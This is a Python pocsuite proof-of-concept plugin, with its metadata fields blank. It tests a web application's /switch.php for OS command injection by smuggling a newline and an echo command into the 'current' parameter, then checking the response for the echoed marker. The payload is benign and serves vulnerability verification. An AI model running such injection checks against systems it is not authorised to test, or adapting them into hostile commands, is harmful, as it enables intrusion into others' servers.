#!/usr/bin/env python
# coding: utf-8

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url

class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = ''''''
	desc = ''''''
	solution = ''''''
	severity = ''''''
	vulType = ''''''
	taskType = ''''''
	references = ['''''']
	appName = ''''''
	appVersion = ''''''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _attack(self):
		return self._verify()

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 80)
		result = {}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
		}
		path="/switch.php?current=1%27%0aecho%20Test^By^ZsfTest$1By$1Zsf"
		vul_url = make_verify_url(self.url,path,mod=0)
		resp = req.get(vul_url, headers = headers, verify = False, allow_redirects = False, timeout = 10)
		if  resp.status_code == 200 and 'TestByZsf' in resp.content:
			result['VerifyInfo'] = http_packet(resp)
			result['VerifyInfo']['URL'] = vul_url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)